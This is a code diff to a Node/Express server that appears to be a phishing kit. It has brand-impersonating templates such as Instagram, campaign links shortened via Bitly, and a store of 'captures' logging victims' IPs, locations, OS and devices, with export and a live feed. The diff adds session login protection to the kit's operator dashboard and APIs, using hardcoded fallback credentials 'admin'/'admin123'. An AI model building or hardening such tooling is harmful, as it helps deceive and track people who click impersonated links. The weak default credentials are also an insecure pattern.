@@ -5,6 +5,7 @@ const UAParser = require('ua-parser-js');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
+const session = require('express-session');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -12,6 +13,8 @@ const DATA_DIR = path.join(__dirname, 'data');
 const CAPTURES_FILE = path.join(DATA_DIR, 'captures.json');
 const CAMPAIGNS_FILE = path.join(DATA_DIR, 'campaigns.json');
 const BITLY_TOKEN = process.env.BITLY_TOKEN;
+const DASH_USER = process.env.DASH_USER || 'admin';
+const DASH_PASS = process.env.DASH_PASS || 'admin123';
 
 let sseClients = [];
 
@@ -22,6 +25,22 @@ app.set('view engine', 'ejs');
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
+app.use(session({
+  secret: crypto.randomBytes(32).toString('hex'),
+  resave: false,
+  saveUninitialized: false,
+  cookie: { httpOnly: true, sameSite: 'lax', maxAge: 24 * 60 * 60 * 1000 }
+}));
+
+function requireAuth(req, res, next) {
+  if (req.session?.authenticated) return next();
+  res.redirect('/login');
+}
+
+function requireAuthJSON(req, res, next) {
+  if (req.session?.authenticated) return next();
+  res.status(401).json({ error: 'Unauthorized' });
+}
 
 function readJSON(file) {
   try {
@@ -75,22 +94,42 @@ const TEMPLATES = {
   instagram: { name: 'Instagram', file: 'instagram', redirect: 'https://www.instagram.com', icon: '📷' },
 };
 
-// ── Campaign routes ──────────────────────────────────────────
+// ── Auth routes ───────────────────────────────────────────────
 
-app.get('/dashboard', (req, res) => {
+app.get('/login', (req, res) => {
+  if (req.session?.authenticated) return res.redirect('/dashboard');
+  res.render('login');
+});
+
+app.post('/login', (req, res) => {
+  const { username, password } = req.body;
+  if (username === DASH_USER && password === DASH_PASS) {
+    req.session.authenticated = true;
+    return res.redirect('/dashboard');
+  }
+  res.render('login', { error: 'Invalid credentials' });
+});
+
+app.get('/logout', (req, res) => {
+  req.session.destroy(() => res.redirect('/login'));
+});
+
+// ── Protected routes ─────────────────────────────────────────
+
+app.get('/dashboard', requireAuth, (req, res) => {
   const captures = readCaptures();
   const campaigns = readCampaigns();
   res.render('dashboard', { captures: captures.reverse(), count: captures.length, campaigns, templates: TEMPLATES });
 });
 
-app.get('/api/captures', (req, res) => {
+app.get('/api/captures', requireAuthJSON, (req, res) => {
   let captures = readCaptures();
   const { campaign } = req.query;
   if (campaign) captures = captures.filter(c => c.campaign === campaign);
   res.json(captures.reverse());
 });
 
-app.get('/api/stats', (req, res) => {
+app.get('/api/stats', requireAuthJSON, (req, res) => {
   const captures = readCaptures();
   const total = captures.length;
   const uniqueIPs = [...new Set(captures.map(c => c.ip))].length;
@@ -122,7 +161,7 @@ app.get('/api/stats', (req, res) => {
   res.json({ total, uniqueIPs, countries, byTemplate, byCountry, byOS, byDevice, timeline });
 });
 
-app.get('/api/captures/export/:format', (req, res) => {
+app.get('/api/captures/export/:format', requireAuthJSON, (req, res) => {
   const captures = readCaptures();
   const { format } = req.params;
   if (format === 'csv') {
@@ -140,9 +179,9 @@ app.get('/api/captures/export/:format', (req, res) => {
   }
 });
 
-// ── Live SSE ─────────────────────────────────────────────────
+// ── Live SSE (protected) ─────────────────────────────────────
 
-app.get('/api/live', (req, res) => {
+app.get('/api/live', requireAuthJSON, (req, res) => {
   res.writeHead(200, {
     'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache',
     'Connection': 'keep-alive', 'Access-Control-Allow-Origin': '*'
@@ -152,11 +191,11 @@ app.get('/api/live', (req, res) => {
   req.on('close', () => { sseClients = sseClients.filter(c => c !== res); });
 });
 
-// ── Campaign management ──────────────────────────────────────
+// ── Campaign management (protected) ──────────────────────────
 
-app.get('/api/campaigns', (req, res) => res.json(readCampaigns()));
+app.get('/api/campaigns', requireAuthJSON, (req, res) => res.json(readCampaigns()));
 
-app.post('/api/campaigns', (req, res) => {
+app.post('/api/campaigns', requireAuthJSON, (req, res) => {
   const { name, template, redirect } = req.body;
   if (!name || !template) return res.status(400).json({ error: 'Name and template required' });
   const campaigns = readCampaigns();
@@ -166,7 +205,7 @@ app.post('/api/campaigns', (req, res) => {
   res.json({ id, link: `${req.protocol}://${req.get('host')}/c/${id}` });
 });
 
-app.delete('/api/campaigns/:id', (req, res) => {
+app.delete('/api/campaigns/:id', requireAuthJSON, (req, res) => {
   let campaigns = readCampaigns();
   campaigns = campaigns.filter(c => c.id !== req.params.id);
   saveCampaigns(campaigns);
